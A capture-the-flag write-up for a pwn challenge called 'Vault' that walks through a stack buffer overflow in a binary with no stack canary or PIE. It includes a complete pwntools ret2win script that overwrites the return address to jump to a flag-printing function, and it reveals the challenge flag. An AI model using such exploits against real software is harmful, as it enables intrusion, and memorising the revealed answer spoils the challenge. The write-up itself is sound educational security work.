# Vault Writeup

![](attachments/Pasted%20image%2020251130164254.png)

## Analysis

We started by analyzing the binary using `file` and `checksec` (via pwntools).

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

The binary has no stack canary and no PIE, which makes it easier to exploit.

Disassembling the binary with `objdump`, we found a `get_input` function:

```assembly
4011c1:       sub    rsp,0x30
...
4011fd:       call   401070 <read@plt>
```

It allocates 0x30 (48) bytes for a buffer but reads 0xa0 (160) bytes. This is a clear buffer overflow vulnerability.

We also found a function `sanctum_call` at `0x401186` which prints the flag:

```assembly
401186 <sanctum_call>:
...
4011b2:       call   401060 <printf@plt> ; Prints FLAG: ...
```

## Solution

We need to overflow the buffer in `get_input` and overwrite the return address to jump to `sanctum_call`.

**Padding Calculation:**
- Buffer size: 0x30 = 48 bytes
- Saved RBP: 8 bytes
- Total padding: 48 + 8 = 56 bytes

**Exploit Script:**

```python
from pwn import *

exe = './vault'
elf = ELF(exe)
context.binary = exe

io = process(exe)

# Handle "Enter your ID:"
io.recvuntil(b"Enter your ID: ")
io.sendline(b"A")

# Handle "Say the sanctum words:"
io.recvuntil(b"Say the sanctum words: ")

# Construct payload
padding = b"A" * 56
sanctum_call_addr = p64(0x401186)

payload = padding + sanctum_call_addr

io.sendline(payload)

print(io.recvall().decode(errors='ignore'))
```

Running the exploit locally reveals the flag content.

## Flag

`Nova_ctf{Nova_Pwn_2025!}`


![](attachments/Pasted%20image%2020251130164501.png)


